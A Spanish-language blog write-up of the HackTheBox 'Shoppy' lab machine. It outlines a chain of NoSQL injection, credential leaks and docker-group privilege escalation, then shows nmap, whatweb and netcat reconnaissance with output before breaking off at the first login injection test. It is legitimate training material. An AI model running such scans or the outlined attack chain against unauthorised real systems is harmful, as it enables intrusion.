<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Shoppy" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBShoppy/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBShoppy/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-10-04T11:58:15-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Shoppy" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-04T11:58:15-05:00","datePublished":"2022-10-04T11:58:15-05:00","description":"Overview","headline":"Hackthebox Writeup Shoppy","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBShoppy/"},"url":"https://e1p0tr0.github.io/posts/HTBShoppy/"}</script><title>Hackthebox Writeup Shoppy | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Shoppy</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Shoppy</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1664902695" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-10-04 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4058 words"> <em>22 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><ol><li>Bypass login page by <strong>NoSQL Injection</strong><li>User credentials by <strong>User enumeration</strong><li>Leak of SSH credentials in <strong>Mattermost</strong> system (Foothold)<li>SSH credentials leak by <strong>Reverse engineering</strong> to binary<li>Host-to-container filesystem mount <strong>by non-privileged user docker group</strong> (Privilege Escalation)</ol><hr /><p><img data-src="/assets/img/htb/writeups/shoppy/logo.png" alt="Logo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.180<td style="text-align: center">17 Sep 2022<td style="text-align: center">Easy<td style="text-align: center">20</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexión con la máquina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.180
PING 10.10.11.180 <span class="o">(</span>10.10.11.180<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.180: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>106 ms
                                          <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.180 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 103.824/103.824/103.824/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Empezamos con la fase de reconocimiento haciendo un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir los puertos abiertos de la máquina:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.180
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 12:06 -05
Nmap scan report for 10.10.11.180
Host is up (0.11s latency).
Not shown: 65389 closed tcp ports (reset), 143 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
                \_________________ Secure Shell Protocol
80/tcp   open  http
                \_________________ Hypertext Transfer Protocol
9093/tcp open  copycat
                \_________________ Copycat database replication service
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>–open : Escanear solo puertos abiertos</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Ahora realizamos un escaneo mas profundo para encontrar que servicios corren por cada uno de los puertos descubiertos <strong>22(SSH) - 80(HTTP) - 9093(copycat)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p22,80,9093 -sCV -oN openPortsTCP 10.10.11.180
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 13:09 -05
Nmap scan report for 10.10.11.180
Host is up (0.13s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
</span><span class="gp">|     Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
<span class="go">|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
</span><span class="gp">|     Content-Type: text/plain;</span><span class="w"> </span><span class="nv">version</span><span class="o">=</span>0.0.4<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
<span class="go">|     Date: Tue, 04 Oct 2022 18:03:39 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 27
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 27
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 3.9011e-05
|     go_gc_duration_seconds{quantile="0.25"} 7.1685e-05
|     go_gc_d
|   HTTPOptions: 
|     HTTP/1.0 200 OK
</span><span class="gp">|     Content-Type: text/plain;</span><span class="w"> </span><span class="nv">version</span><span class="o">=</span>0.0.4<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
<span class="go">|     Date: Tue, 04 Oct 2022 18:03:40 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 27
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 27
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 3.9011e-05
|     go_gc_duration_seconds{quantile="0.25"} 7.1685e-05
|_    go_gc_d
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9093-TCP:V=7.92%I=7%D=10/4%Time=633C757A%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
</span><span class="gp">SF:ext/plain;</span><span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span>utf-8<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n\r\n</span>400<span class="se">\x</span>20Bad<span class="se">\x</span>
<span class="go">SF:20Request")%r(GetRequest,2A5A,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
</span><span class="gp">SF:x20text/plain;</span><span class="se">\x</span><span class="nv">20version</span><span class="o">=</span>0<span class="se">\.</span>0<span class="se">\.</span>4<span class="p">;</span><span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span>utf-8<span class="se">\r\n</span>Date:<span class="se">\x</span>20Tue,<span class="se">\x</span>2
<span class="gp">SF:004\x20Oct\x202022\x2018:03:39\x20GMT\r\n\r\n#</span><span class="se">\x</span>20HELP<span class="se">\x</span>20go_gc_cycles_
<span class="go">SF:automatic_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x
</span><span class="gp">SF:20generated\x20by\x20the\x20Go\x20runtime\.\n#</span><span class="se">\x</span>20TYPE<span class="se">\x</span>20go_gc_cycles_
<span class="go">SF:automatic_gc_cycles_total\x20counter\ngo_gc_cycles_automatic_gc_cycles_
</span><span class="gp">SF:total\x2027\n#</span><span class="se">\x</span>20HELP<span class="se">\x</span>20go_gc_cycles_forced_gc_cycles_total<span class="se">\x</span>20Count<span class="se">\</span>
<span class="go">SF:x20of\x20completed\x20GC\x20cycles\x20forced\x20by\x20the\x20applicatio
</span><span class="gp">SF:n\.\n#</span><span class="se">\x</span>20TYPE<span class="se">\x</span>20go_gc_cycles_forced_gc_cycles_total<span class="se">\x</span>20counter<span class="se">\n</span>go_gc
<span class="gp">SF:_cycles_forced_gc_cycles_total\x200\n#</span><span class="se">\x</span>20HELP<span class="se">\x</span>20go_gc_cycles_total_gc
<span class="gp">SF:_cycles_total\x20Count\x20of\x20all\x20completed\x20GC\x20cycles\.\n#</span><span class="se">\x</span>
<span class="go">SF:20TYPE\x20go_gc_cycles_total_gc_cycles_total\x20counter\ngo_gc_cycles_t
</span><span class="gp">SF:otal_gc_cycles_total\x2027\n#</span><span class="se">\x</span>20HELP<span class="se">\x</span>20go_gc_duration_seconds<span class="se">\x</span>20A<span class="se">\x</span>2
<span class="go">SF:0summary\x20of\x20the\x20pause\x20duration\x20of\x20garbage\x20collecti
</span><span class="gp">SF:on\x20cycles\.\n#</span><span class="se">\x</span>20TYPE<span class="se">\x</span>20go_gc_duration_seconds<span class="se">\x</span>20summary<span class="se">\n</span>go_gc_d
<span class="go">SF:uration_seconds{quantile=\"0\"}\x203\.9011e-05\ngo_gc_duration_seconds{
SF:quantile=\"0\.25\"}\x207\.1685e-05\ngo_gc_d")%r(HTTPOptions,2F0E,"HTTP/
</span><span class="gp">SF:1\.0\x20200\x20OK\r\nContent-Type:\x20text/plain;</span><span class="se">\x</span><span class="nv">20version</span><span class="o">=</span>0<span class="se">\.</span>0<span class="se">\.</span>4<span class="p">;</span><span class="se">\x</span>
<span class="go">SF:20charset=utf-8\r\nDate:\x20Tue,\x2004\x20Oct\x202022\x2018:03:40\x20GM
</span><span class="gp">SF:T\r\n\r\n#</span><span class="se">\x</span>20HELP<span class="se">\x</span>20go_gc_cycles_automatic_gc_cycles_total<span class="se">\x</span>20Count<span class="se">\x</span>
<span class="go">SF:20of\x20completed\x20GC\x20cycles\x20generated\x20by\x20the\x20Go\x20ru
</span><span class="gp">SF:ntime\.\n#</span><span class="se">\x</span>20TYPE<span class="se">\x</span>20go_gc_cycles_automatic_gc_cycles_total<span class="se">\x</span>20counter
<span class="gp">SF:\ngo_gc_cycles_automatic_gc_cycles_total\x2027\n#</span><span class="se">\x</span>20HELP<span class="se">\x</span>20go_gc_cycl
<span class="go">SF:es_forced_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x
</span><span class="gp">SF:20forced\x20by\x20the\x20application\.\n#</span><span class="se">\x</span>20TYPE<span class="se">\x</span>20go_gc_cycles_force
<span class="go">SF:d_gc_cycles_total\x20counter\ngo_gc_cycles_forced_gc_cycles_total\x200\
</span><span class="gp">SF:n#</span><span class="se">\x</span>20HELP<span class="se">\x</span>20go_gc_cycles_total_gc_cycles_total<span class="se">\x</span>20Count<span class="se">\x</span>20of<span class="se">\x</span>20all<span class="se">\</span>
<span class="gp">SF:x20completed\x20GC\x20cycles\.\n#</span><span class="se">\x</span>20TYPE<span class="se">\x</span>20go_gc_cycles_total_gc_cycl
<span class="gp">SF:es_total\x20counter\ngo_gc_cycles_total_gc_cycles_total\x2027\n#</span><span class="se">\x</span>20HEL
<span class="go">SF:P\x20go_gc_duration_seconds\x20A\x20summary\x20of\x20the\x20pause\x20du
</span><span class="gp">SF:ration\x20of\x20garbage\x20collection\x20cycles\.\n#</span><span class="se">\x</span>20TYPE<span class="se">\x</span>20go_gc_d
<span class="go">SF:uration_seconds\x20summary\ngo_gc_duration_seconds{quantile=\"0\"}\x203
SF:\.9011e-05\ngo_gc_duration_seconds{quantile=\"0\.25\"}\x207\.1685e-05\n
</span><span class="gp">SF:go_gc_d");</span><span class="w">
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sCV (Fusión de parámetros -sC -sV)</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><blockquote class="prompt-warning"><div><p>Existe un <strong>falso positivo</strong> en el puerto <strong>9093</strong> por parte de <code class="language-plaintext highlighter-rouge">nmap</code> al momento del reconocimiento del mismo</p></div></blockquote><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>9093/tcp open  copycat?
...
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
</pre></table></code></div></div><p>Ya que no disponemos de credenciales omitimos analizar el puerto <strong>22(SSH)</strong> y empezamos con el reconocimiento del puerto <strong>80(HTTP)</strong>. Para ello iniciamos escaneando que tecnologías usa el servicio web:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">whatweb</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">❯ whatweb 10.10.11.180
http://10.10.11.180 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.23.1], IP[10.10.11.180], RedirectLocation[http://shoppy.htb], Title[301 Moved Permanently], nginx[1.23.1]
ERROR Opening: http://shoppy.htb - no address for shoppy.htb &lt;-- Here
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Si prefieres una herramienta con interfaz mas amigable puedes usar la extensión <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a></p></div></blockquote><p>Lo que hacen estas herramientas es realizar diferentes tipos de solicitudes a la web y a traves de la respuesta, ya sea en los headers o código fuente, almacenan las diferentes versiones de las tecnologías que se usa, por ejemplo:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">nc</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="go">❯ nc 10.10.11.180 80
GET / HTTP/1.0

HTTP/1.1 301 Moved Permanently      
Server: nginx/1.23.1
Date: Tue, 04 Oct 2022 18:22:42 GMT
Content-Type: text/html
Content-Length: 169
Connection: close
Location: http://shoppy.htb &lt;-- Here (ask a web browser to load a different web page)

</span><span class="gp">&lt;html&gt;</span><span class="w">
</span><span class="gp">&lt;head&gt;</span>&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
<span class="gp">&lt;body&gt;</span><span class="w">
</span><span class="gp">&lt;center&gt;</span>&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
<span class="gp">&lt;hr&gt;</span>&lt;center&gt;nginx/1.23.1&lt;/center&gt;
<span class="gp">&lt;/body&gt;</span><span class="w">
</span><span class="gp">&lt;/html&gt;</span><span class="w">
</span></pre></table></code></div></div><p>En ambos casos, llama nuestra atención la redirección hacia el dominio <code class="language-plaintext highlighter-rouge">shoppy.htb</code> al momento de la solicitud al servicio web</p><p>Entonces sabemos que se aplica <strong>Virtual hosting</strong> del tipo <strong>Domain name</strong>, lo cúal permite que una dirección <strong>IP</strong> funcione para varias paǵinas web. Para ello, debemos agregar el dominio <code class="language-plaintext highlighter-rouge">shoppy.htb</code> a nuestro archivo <em>/etc/hosts</em> que se encargará de la resolución de direcciones IP y nombres de dominio</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"10.10.11.180 shoppy.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><p>Al entrar a <code class="language-plaintext highlighter-rouge">http://10.10.11.180</code> observaremos que habrá una redirección a <code class="language-plaintext highlighter-rouge">http://shoppy.htb</code></p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">Chromium</code></p></blockquote><p><img data-src="/assets/img/htb/writeups/shoppy/shoppy_htb_web.png" alt="shoppy.htb-web" class="shadow" data-proofer-ignore></p><p>Como no tenemos una interfaz con funcionalidad procedemos a enumerar que directorios existen en la web, para empezar usamos el script <code class="language-plaintext highlighter-rouge">http-enum</code> de <code class="language-plaintext highlighter-rouge">nmap</code></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p80 --script http-enum shoppy.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 14:13 -05
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /login/: Login page
</span></pre></table></code></div></div><p>Únicamente encontramos la ruta <code class="language-plaintext highlighter-rouge">/login</code> con la siguiente interfaz:</p><p><img data-src="/assets/img/htb/writeups/shoppy/shoppy_htb_login_web.png" alt="shoppy.htb-login-web" class="shadow" data-proofer-ignore></p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Es importante saber que al estar <strong>frente a una página de logeo podemos aplicar diversar técnicas para evadirlas</strong>, ya sea revisando el código fuente hasta o probar distintas inyecciones de autenticación. En está ocasión primero testeamos si podemos enumerar usuarios debido a la respuesta (el clásico <em>El usuario x no existe</em> ó <em>Contraseña incorrecta para el usuario x, etc</em>). Sin embargo conseguimos la misma respuesta para cualquiera de las alternativas <strong>Wrong Credentials</strong> (manera efectiva de evitar este tipo de ataques de enumeración)</p><p>En el transcurso de probar diversos payloads y cambiando la cabezera <code class="language-plaintext highlighter-rouge">Content-Type</code> para la inyección que veremos luego pude generar un error y se filtro información importante que nos permitió enumerar un usario del sistema <code class="language-plaintext highlighter-rouge">jaeger</code> por la ruta <em>/home</em></p><p><img data-src="/assets/img/htb/writeups/shoppy/shoppy_htb_login_error_user_enumeration.png" alt="shoppy.htb-error-user-enumeration" class="shadow" data-proofer-ignore></p><p>Lo que si obtuvo un comportamiento raro fue al intentar una <strong>Inyección SQL</strong>, ya que al ejecutar el clásico input de comilla simple <code class="language-plaintext highlighter-rouge">'</code> para verificar una posible respuesta con errores e información respecto a la <strong>base de datos existente</strong> que corre por detrás, la página se queda cargando y después de un minuto obtenemos un <strong>504 Gateway 